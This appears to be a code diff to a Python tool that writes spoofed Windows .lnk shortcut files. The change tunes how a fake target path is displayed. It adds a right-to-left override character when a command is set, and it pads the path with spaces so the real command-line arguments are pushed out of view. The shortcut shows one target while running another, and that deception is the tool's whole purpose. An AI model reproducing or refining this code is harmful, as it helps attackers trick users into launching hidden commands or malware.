@@ -41,7 +41,7 @@ class LnkWriterFakeTargetExe(LnkWriter):
         FORBIDDEN_CHARACTERS = ["<", ">", '"', "|", "?", "*"]
         if not any(char in FORBIDDEN_CHARACTERS for char in lnk.fake_path):
             logging.warning("adding double quotes and RTL character to fake path \"%s\"" % lnk.fake_path)
-            lnk.fake_path = f'"{lnk.fake_path}"\u202E'
+            lnk.fake_path = f'"{lnk.fake_path}"{'\u202E' if lnk.target_cmd else ''}'
 
         # SHELL LINK HEADER
         f.write(SHELL_LINK_HEADER.write(link_flags=[SHELL_LINK_HEADER.LinkFlags.HasLinkTargetIDList,
@@ -118,6 +118,11 @@ class LnkWriterOverflow(LnkWriter):
             f.write(ByteTools.create_bytes(len(lnk.target_cmd), 2) + lnk.target_cmd.encode('utf-16le'))
         f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode('utf-16le'))
         # EXTRA DATA
+        if lnk.target_cmd and len(lnk.fake_path) < 60:
+            logging.warning("Padding fake path with spaces to visually hide command-line arguments")
+            if not lnk.fake_path[-1] == '"':
+                lnk.fake_path += '"'
+            lnk.fake_path = lnk.fake_path.ljust(255, " ")
         f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
                 + lnk.fake_path.encode('utf-8') + ByteTools.create_bytes(0x00, 260-len(lnk.fake_path.encode('utf-8')))
                 + lnk.fake_path.encode('utf-16le') + ByteTools.create_bytes(0x00, 520-len(lnk.fake_path.encode('utf-16le')))
